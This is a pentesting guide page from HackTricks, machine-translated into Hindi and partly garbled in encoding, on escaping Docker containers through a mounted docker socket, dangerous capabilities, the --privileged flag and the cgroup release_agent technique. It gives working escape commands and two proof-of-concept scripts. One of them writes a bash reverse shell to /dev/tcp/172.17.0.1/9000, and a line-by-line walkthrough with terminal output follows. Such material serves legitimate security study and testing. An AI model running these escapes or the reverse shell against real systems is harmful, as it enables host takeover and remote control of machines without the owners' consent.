<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>


# рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреНрдпрд╛ рд╣реИ

рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ, рдпрд╣ рдПрдХ **рдЕрд▓рдЧ** **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рд╣реИ рдЬрд┐рд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **cgroups** (рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реА рдЪреАрдЬреЗрдВ, рдЬреИрд╕реЗ CPU рдФрд░ RAM) рдФрд░ **рдиреЗрдорд╕реНрдкреЗрд╕** (рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реА рдЪреАрдЬреЗрдВ, рдЬреИрд╕реЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рдпрд╛ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрд▓рдЧ рд╣реЛрддреА рд╣реИ:
```bash
docker run -dt --rm denial sleep 1234 #Run a large sleep inside a Debian container
ps -ef | grep 1234 #Get info about the sleep process
ls -l /proc/<PID>/ns #Get the Group and the namespaces (some may be uniq to the hosts and some may be shred with it)
```
# рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЧрдП рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдкрд╛рдПрдВ рдХрд┐ **рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░, рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХреЗрдВрдЧреЗред\
рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ рдбреЙрдХрд░ рдбреЗрдорди рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд╕рдХреЗрдВред
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рд╕рд╛рдорд╛рдиреНрдп рдбреЙрдХрд░ рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЙрдХрд░ рдбреАрдорди рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```
{% hint style="info" %}
рдпрджрд┐ **рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рд╕реНрдерд╛рди рдореЗрдВ рд╣реИ** рддреЛ рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде рдЕрднреА рднреА рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **`docker`** рдХрдорд╛рдВрдб рдХрд╛ рдкреНрд░рдпреЛрдЧ рдХрд░рдХреЗ **`-H unix:///path/to/docker.sock`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде
{% endhint %}

# рдХрдВрдЯреЗрдирд░ рдХреНрд╖рдорддрд╛рдПрдВ

рдЖрдкрдХреЛ рдХрдВрдЯреЗрдирд░ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП, рдпрджрд┐ рдЗрд╕рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**

рдЖрдк рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
capsh --print
```
рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдЖрдк **рд▓рд┐рдирдХреНрд╕ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

# `--privileged` рдлрд╝реНрд▓реИрдЧ

--privileged рдлрд╝реНрд▓реИрдЧ рдХрдВрдЯреЗрдирд░ рдХреЛ рд╣реЛрд╕реНрдЯ рдЙрдкрдХрд░рдгреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

## рдореИрдВ рд░реВрдЯ рдХреЗ рдорд╛рд▓рд┐рдХ рд╣реВрдБ

рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░реНрд╕ **fdisk -l** рдЬреИрд╕реЗ рдХрдорд╛рдВрдб рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрдВрдЧреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдбреЙрдХрд░ рдХрдорд╛рдВрдб рдореЗрдВ --privileged рдлрд╝реНрд▓реИрдЧ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реЛрдиреЗ рдкрд░, рд╣реЛрд╕реНрдЯ рдбреНрд░рд╛рдЗрд╡ рджреЗрдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

рдЗрд╕рд▓рд┐рдП, рд╣реЛрд╕реНрдЯ рдорд╢реАрди рдкрд░ рдХрд╛рдмрд┐рдЬрд╝ рд╣реЛрдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рди рд╣реИ:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
рдФрд░ рд╡рд╣рд╛рдВ! рдЕрдм рдЖрдк рд╣реЛрд╕реНрдЯ рдХреА рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ `/mnt/hola` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдорд╛рдЙрдВрдЯ рд╣реЛ рдЧрдпрд╛ рд╣реИред

{% code title="рдкреНрд░рд╛рдердорд┐рдХ PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% code title="рджреВрд╕рд░рд╛ рдкреНрд░рдорд╛рдг" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

`--privileged` рдлреНрд▓реИрдЧ рдореЗрдВ рдмрдбрд╝реА рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЛ рдкреЗрд╢ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдЗрд╕ рдЙрддреНрдкрд╛рджрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЗрд╕ рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп, рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рд╕рднреА рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдкреВрд░реНрдг рдкрд╣реБрдВрдЪ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ seccomp, AppArmor рдФрд░ Linux capabilities рдХреА рдкреНрд░рддрд┐рдмрдВрдзрди рд╕реЗ рд╡рдВрдЪрд┐рдд рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, `--privileged` рдЗрд╕ рддрд░реАрдХреЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╕реЗ рдЕрдзрд┐рдХ рдЕрдиреБрдорддрд┐рдпрд╛рдВ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, "рдХреЗрд╡рд▓" рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рд╣реИрдВ:

1. рд╣рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП
2. рдХрдВрдЯреЗрдирд░ рдХреЛ `SYS_ADMIN` Linux capability рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП
3. рдХрдВрдЯреЗрдирд░ рдХреЛ AppArmor рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХреА рдХрдореА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, рдпрд╛ рдлрд┐рд░ `mount` syscall рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреА рдЪрд╛рд╣рд┐рдП
4. cgroup v1 рд╡рд░реНрдЪреБрдЕрд▓ рдлрд╝рд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ read-write рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП

`SYS_ADMIN` capability рдХрдВрдЯреЗрдирд░ рдХреЛ рдорд╛рдЙрдВрдЯ syscall рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ (рджреЗрдЦреЗрдВ [man 7 capabilities](https://linux.die.net/man/7/capabilities))ред [рдбреЙрдХрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реАрдорд┐рдд рд╕рдВрдЦреНрдпрд╛ рдХреА capabilities рдХреЗ рд╕рд╛рде рдХрдВрдЯреЗрдирд░ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) рдФрд░ `SYS_ADMIN` capability рдХреЛ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЗ рдХрд╛рд░рдгред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдбреЙрдХрд░ [рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `docker-default` AppArmor рдкреЙрд▓рд┐рд╕реА рдХреЗ рд╕рд╛рде рдХрдВрдЯреЗрдирд░ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ](https://docs.docker.com/engine/security/apparmor/#understand-the-policies), рдЬреЛ [mount syscall рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) рдЬрдмрдХрд┐ рдХрдВрдЯреЗрдирд░ `SYS_ADMIN` рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрджрд┐ рдХрдВрдЯреЗрдирд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлреНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рддрдХрдиреАрдХ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрдХреНрд░рдорд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## рдкреНрд░реВрдл рдСрдл рдХреЙрдиреНрд╕реЗрдкреНрдЯ рдХреЛ рд╡рд┐рдЪрд╛рд░рд╢реАрд▓ рдмрдирд╛рдирд╛

рдЕрдм рдЬрдм рд╣рдореЗрдВ рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рд╕рдордЭ рдореЗрдВ рдЖ рдЧрдИ рд╣реИрдВ рдФрд░ рд╣рдордиреЗ рдкреНрд░реВрдл рдСрдл рдХреЙрдиреНрд╕реЗрдкреНрдЯ рдЙрддреНрдкрд╛рджрди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рд╣реИ, рдЪрд▓рд┐рдП рдЗрд╕реЗ рд▓рд╛рдЗрди-рдмрд╛рдЗ-рд▓рд╛рдЗрди рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдХреЗ рджреЗрдЦреЗрдВ рдХрд┐ рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рдЙрддреНрдкрд╛рджрди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рдПрдХ cgroup рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬрд╣рд╛рдВ рд╣рдо `release_agent` рдлрд╝рд╛рдЗрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдорд╛рд░рдХрд░ `release_agent` рдЖрд╣реНрд╡рд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕реЗ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдПрдХ cgroup рдирд┐рдпрдВрддреНрд░рдХ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛ рд╣реИ рдФрд░ рдПрдХ рдмрдЪреНрдЪрд╛ cgroup рдмрдирд╛рдирд╛ рд╣реИред

рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдо рдПрдХ `/tmp/cgrp` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдмрдирд╛рддреЗ рд╣реИрдВ, [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup рдирд┐рдпрдВрддреНрд░рдХ рдорд╛рдЙрдВрдЯ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рдмрдЪреНрдЪрд╛ cgroup рдмрдирд╛рддреЗ рд╣реИрдВ (рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП "x" рдирд╛рдорд┐рдд)ред рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╣рд░ cgroup рдирд┐рдпрдВрддреНрд░рдХ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╣ рддрдХрдиреАрдХ рдЕрдзрд┐рдХрд╛рдВрд╢ cgroup рдирд┐рдпрдВрддреНрд░рдХреЛрдВ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред

рдпрджрд┐ рдЖрдк рдЗрд╕реЗ рдлрд╝реЙрд▓реЛ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ "mount: /tmp/cgrp: special device cgroup does not exist" рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рд╕реЗрдЯрдЕрдк рдореЗрдВ RDMA cgroup рдирд┐рдпрдВрддреНрд░рдХ рдирд╣реАрдВ рд╣реИред рдЗрд╕реЗ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `rdma` рдХреЛ `memory` рдореЗрдВ рдмрджрд▓реЗрдВред рд╣рдо RDMA рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдореВрд▓ PoC рдХреЗрд╡рд▓ рдЗрд╕рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ cgroup рдирд┐рдпрдВрддреНрд░рдХ рд╕рд╛рд░реНрд╡рднреМрдорд┐рдХ рд╕рдВрд╕рд╛рдзрди рд╣реИрдВ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдХрдИ рдмрд╛рд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рдорд╛рдЙрдВрдЯ рдореЗрдВ рдХрд┐рдП рдЧрдП рдкрд░рд┐рд╡рд░реНрддрди рджреВрд╕рд░реЗ рдорд╛рдЙрдВрдЯ рдкрд░ рд▓рд╛рдЧреВ рд╣реЛрдВрдЧреЗред

рд╣рдо рдиреАрдЪреЗ "x" рдмрдЪреНрдЪрд╛ cgroup рдХреЗ рдирд┐рд░реНрдорд╛рдг рдФрд░ рдЙрд╕рдХреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реВрдЪреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред
```
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
рдЕрдЧрд▓реЗ, рд╣рдо "x" рд╕реАрдЧреНрд░реБрдк рдХреЗ рд░рд┐рд▓реАрдЬрд╝ рд╣реЛрдиреЗ рдкрд░ рд╕реАрдЧреНрд░реБрдк рд╕реВрдЪрдирд╛рдПрдВ рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕рдХреЗ рд▓рд┐рдП рд╣рдо рдЙрд╕рдХреЗ `notify_on_release` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ 1 рд▓рд┐рдЦрдХрд░ рдХрд░рддреЗ рд╣реИрдВред рд╣рдо рднреА RDMA рд╕реАрдЧреНрд░реБрдк рд░рд┐рд▓реАрдЬрд╝ рдПрдЬреЗрдВрдЯ рдХреЛ рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡рд╣ `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХреЗ - рдЬрд┐рд╕реЗ рд╣рдо рдмрд╛рдж рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдмрдирд╛рдПрдВрдЧреЗ - рд╣реЛрд╕реНрдЯ рдкрд░ `release_agent` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╣реЛрд╕реНрдЯ рдкрд░ `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкрде рд▓рд┐рдЦрдХрд░ред рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдХрдВрдЯреЗрдирд░ рдХреЗ рдкрде рдХреЛ `/etc/mtab` рдлрд╝рд╛рдЗрд▓ рд╕реЗ рд╣реЛрд╕реНрдЯ рдкрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВрдЧреЗред

рд╣рдо рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдЬреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рд╡реЗ рд╣реЛрд╕реНрдЯ рдкрд░ рдореМрдЬреВрдж рд╣реЛрддреА рд╣реИрдВ, рдФрд░ рдЗрдиреНрд╣реЗрдВ рджреЛрдиреЛрдВ рджреБрдирд┐рдпреЛрдВ рд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдкрде рдФрд░ рд╣реЛрд╕реНрдЯ рдкрд░ рдЙрдирдХрд╛ рдкрдеред

рдЗрди рдХрд╛рд░реНрд░рд╡рд╛рдЗрдпреЛрдВ рдХреЛ рдиреАрдЪреЗ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
рдиреЛрдЯ рдХрд░реЗрдВ `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдкрде рдХреЛ, рдЬрд┐рд╕реЗ рд╣рдо рд╣реЛрд╕реНрдЯ рдкрд░ рдмрдирд╛рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ:
```
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
